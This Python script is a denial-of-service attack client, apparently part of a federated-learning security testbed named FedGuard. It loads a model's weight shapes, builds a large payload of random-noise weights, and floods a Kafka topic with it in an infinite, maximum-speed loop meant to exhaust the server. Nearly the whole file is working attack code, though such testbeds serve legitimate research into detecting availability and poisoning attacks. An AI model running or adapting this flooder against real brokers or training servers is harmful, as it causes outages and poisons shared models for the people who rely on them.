"""
DDoS Attack Client for FedGuard.
Floods the server with high-frequency model updates to exhaust resources (Availability Attack).
"""
import os
import sys
import json
import numpy as np
import time
import logging
import io
import zlib
from kafka import KafkaProducer

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import *

# Setup logging
os.makedirs(LOGS_DIR, exist_ok=True)
logging.basicConfig(
    level=logging.WARNING,  # Only show warnings to speed up the loop
    format=LOG_FORMAT,
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("ddos_client")

CLIENT_ID = "DDoS-Bot-02"
MODEL_PATH = os.path.join(MODELS_DIR, "ucsd_baseline.h5")

# ATTACK CONFIGURATION
ATTACK_SCALE = 2.0
# 0.0 means go as fast as possible. 0.01 = 100 requests/sec (safer for testing)
FLOOD_DELAY = 0.0  

def serialize_weights_to_bytes(weights_list):
    buf = io.BytesIO()
    savez_dict = {f"arr_{i}": w for i, w in enumerate(weights_list)}
    np.savez_compressed(buf, **savez_dict)
    buf.seek(0)
    raw = buf.read()
    return zlib.compress(raw, level=1) # Low compression level for speed

def make_garbage_weights(shapes):
    """Generate random noise weights matching the model shape."""
    out = []
    for s in shapes:
        # Generate smaller data types to speed up generation
        out.append(np.random.normal(0, ATTACK_SCALE, size=s).astype(np.float32))
    return out

def main():
    try:
        logger.warning("="*60)
        logger.warning("🔥🔥 DDOS ATTACK CLIENT STARTING 🔥🔥")
        logger.warning("="*60)
        logger.warning(f"Target: {KAFKA_SERVER}")
        logger.warning(f"Topic: {KAFKA_TOPIC}")

        # 1. Load Model Shapes (To ensure messages are valid format)
        import tensorflow as tf
        if not os.path.exists(MODEL_PATH):
            logger.error("Baseline model not found! Run training first.")
            return
            
        base_model = tf.keras.models.load_model(MODEL_PATH, compile=False)
        shapes = [w.shape for w in base_model.get_weights()]
        logger.warning(f"[OK] Loaded valid model architecture ({len(shapes)} layers)")

        # 2. Connect to Kafka
        producer = KafkaProducer(
            bootstrap_servers=KAFKA_SERVER,
            value_serializer=lambda v: v,
            acks=1,  # "Fire and forget" - fastest mode, doesn't wait for server ack
            linger_ms=1,
            buffer_memory=33554432,
            max_request_size=60000000,  # <--- CRITICAL FIX: Allow 60MB messages
            compression_type='gzip'

        )
        logger.warning("[OK] Kafka connection ready )")

        # 3. Pre-generate one payload to reuse (Optimization for max throughput)
        # In a real attack, we might vary this, but for flooding, reusing is faster.
        garbage_weights = make_garbage_weights(shapes)
        static_payload = serialize_weights_to_bytes(garbage_weights)
        payload_size_mb = len(static_payload) / (1024*1024)
        
        logger.warning(f"Payload size: {payload_size_mb:.2f} MB")
        logger.warning("STARTING FLOOD IN 3 SECONDS...")
        time.sleep(3)

        attack_count = 0
        start_time = time.time()

        # 4. INFINITE FLOOD LOOP
       # 4. INFINITE FLOOD LOOP
        while True:
            attack_count += 1
            
            metadata = {
                'client_id': CLIENT_ID,
                'update_number': attack_count,
                'status': 'attack',
                'timestamp': time.time()
            }

            # Send the message
            producer.send(
                KAFKA_TOPIC, 
                value=static_payload, 
                key=CLIENT_ID.encode('utf-8'),
                headers=[('metadata', json.dumps(metadata).encode('utf-8'))]
            )

            # CRITICAL: Force the data out to the network every 10 messages
            # This prevents the "fake" high speed and forces the server to deal with it
            if attack_count % 10 == 0:
                producer.flush() 

            # Log stats every 50 messages
            if attack_count % 50 == 0:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rate = attack_count / elapsed
                    sys.stdout.write(f"\r[FLOODING] Sent: {attack_count} | Real Rate: {rate:.1f} msgs/sec | Data: {rate * payload_size_mb:.1f} MB/s")
                    sys.stdout.flush()

            if FLOOD_DELAY > 0:
                time.sleep(FLOOD_DELAY)

    except KeyboardInterrupt:
        logger.warning("\n\nAttack stopped by user.")
    except Exception as e:
        logger.error(f"Error: {e}")
    finally:
        if 'producer' in locals():
            producer.close()

if __name__ == "__main__":
    main()